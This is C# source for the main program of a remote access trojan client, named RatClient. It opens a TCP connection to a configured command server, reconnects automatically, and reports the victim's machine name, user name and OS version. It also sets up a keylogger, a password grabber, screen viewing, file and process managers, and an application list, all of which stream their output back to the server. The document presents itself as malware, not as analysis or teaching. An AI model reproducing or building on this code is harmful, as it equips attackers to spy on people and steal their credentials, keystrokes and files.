using System;
using System.Net.Sockets;
using System.Text;
using System.Web.Script.Serialization;
using System.Collections.Concurrent;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.IO;
using RatClient.Config;
using RatClient.Features;

class Program
{
    #region Variables
    private Config config = new Config();
    static TcpClient client;
    static NetworkStream stream;
    static readonly string Server = Config.IP;
    static readonly int Port = Config.Port;
    static readonly int bufferSize = Config.BufferSize;
    static ConcurrentQueue<string> messageQueue = new ConcurrentQueue<string>();
    static AutoResetEvent messageEvent = new AutoResetEvent(false);
    static Thread sendThread;
    static readonly object streamLock = new object();
    static readonly TimeSpan ReconnectDelay = TimeSpan.FromSeconds(5);
    static readonly int MaxReconnectAttempts = 5;
    static readonly TimeSpan RateLimitInterval = TimeSpan.FromMilliseconds(100);
    static readonly int MaxPacketsPerInterval = 10;
    static Queue<long> packetTimestamps = new Queue<long>();
    #endregion

    #region Features
    static ScreenViewer screenViewer = new ScreenViewer(bufferSize, EnqueueJson);
    static KeyLogger keyLogger = new KeyLogger(EnqueueJson);
    static FileManager fileManager = new FileManager(EnqueueJson);
    static PasswordManager passwordManager = new PasswordManager(EnqueueJson);
    static ProcessManager processManager = new ProcessManager(EnqueueJson);
    static ApplicationEnumeration applicationEnumeration = new ApplicationEnumeration(EnqueueJson);
    #endregion

    public delegate void MessageReceivedHandler(dynamic message);
    public static event MessageReceivedHandler MessageReceived;

    static void Main(string[] args)
    {
        MainAsync(args).GetAwaiter().GetResult();
    }

    static async Task MainAsync(string[] args)
    {
        int reconnectAttempts = 0;

        while (reconnectAttempts < MaxReconnectAttempts)
        {
            try
            {
                await ConnectAndProcessAsync();
                reconnectAttempts = 0;
            }
            catch (Exception e)
            {
                Console.WriteLine($"Exception: {e}");
                await Task.Delay(ReconnectDelay);
                reconnectAttempts++;
            }
        }

        Console.WriteLine("Max reconnection attempts reached. Exiting...");
        Console.ReadKey();
    }

    static async Task ConnectAndProcessAsync()
    {
        using (client = new TcpClient())
        {
            await client.ConnectAsync(Server, Port);
            stream = client.GetStream();

            sendThread = new Thread(ProcessQueue);
            sendThread.Start();

            SendInfo();

            byte[] data = new byte[bufferSize];
            while (true)
            {
                int bytes = await stream.ReadAsync(data, 0, data.Length);
                if (bytes == 0) break;
                string responseData = Encoding.UTF8.GetString(data, 0, bytes);
                dynamic responseJson = new JavaScriptSerializer().Deserialize<dynamic>(responseData);

                HandleResponse(responseJson);
                MessageReceived?.Invoke(responseJson);
            }
        }
    }

    static void EnqueueJson(object jsonObject)
    {
        string jsonString = new JavaScriptSerializer().Serialize(jsonObject);
        messageQueue.Enqueue(jsonString);
        messageEvent.Set();
    }

    static async void ProcessQueue()
    {
        while (true)
        {
            await messageEvent.WaitOneAsync();
            while (messageQueue.TryDequeue(out string jsonString))
            {
                await SendDataWithRateLimitAsync(jsonString);
            }
        }
    }

    static async Task SendDataWithRateLimitAsync(string jsonString)
    {
        while (true)
        {
            long currentTime = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();

            lock (packetTimestamps)
            {
                while (packetTimestamps.Count > 0 && currentTime - packetTimestamps.Peek() > RateLimitInterval.TotalMilliseconds)
                {
                    packetTimestamps.Dequeue();
                }

                if (packetTimestamps.Count < MaxPacketsPerInterval)
                {
                    packetTimestamps.Enqueue(currentTime);
                    break;
                }
            }

            await Task.Delay(RateLimitInterval);
        }

        byte[] data = Encoding.UTF8.GetBytes(jsonString);
        int bytesSent = 0;
        int bytesLeft = data.Length;

        while (bytesLeft > 0)
        {
            int chunkSize = Math.Min(bufferSize, bytesLeft);
            try
            {
                await stream.WriteAsync(data, bytesSent, chunkSize);
                bytesSent += chunkSize;
                bytesLeft -= chunkSize;
            }
            catch (IOException)
            {
                break;
            }
        }
    }

    static void HandleResponse(dynamic responseJson)
    {
        switch (responseJson["type"].ToString())
        {
            case "heartbeat":
                EnqueueJson(new { type = "heartbeat", text = "pong" });
                break;
        }
    }

    static void SendInfo()
    {
        var osInfo = new Tuple<string, string>(Environment.OSVersion.ToString(), Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit");
        var jsonOSInfo = new
        {
            type = "system_info",
            os = osInfo.Item1 + " " + osInfo.Item2,
            pc = Environment.MachineName,
            user = Environment.UserName
        };
        EnqueueJson(jsonOSInfo);
    }
}

public static class WaitHandleExtensions
{
    public static Task<bool> WaitOneAsync(this WaitHandle handle, int millisecondsTimeout = Timeout.Infinite)
    {
        if (handle == null)
            throw new ArgumentNullException(nameof(handle));

        var tcs = new TaskCompletionSource<bool>();
        var rwh = ThreadPool.RegisterWaitForSingleObject(handle,
            (state, timedOut) => tcs.TrySetResult(!timedOut),
            null, millisecondsTimeout, true);
        var task = tcs.Task;
        task.ContinueWith((antecedent, state) => ((RegisteredWaitHandle)state).Unregister(null), rwh,
            TaskContinuationOptions.ExecuteSynchronously);
        return task;
    }
}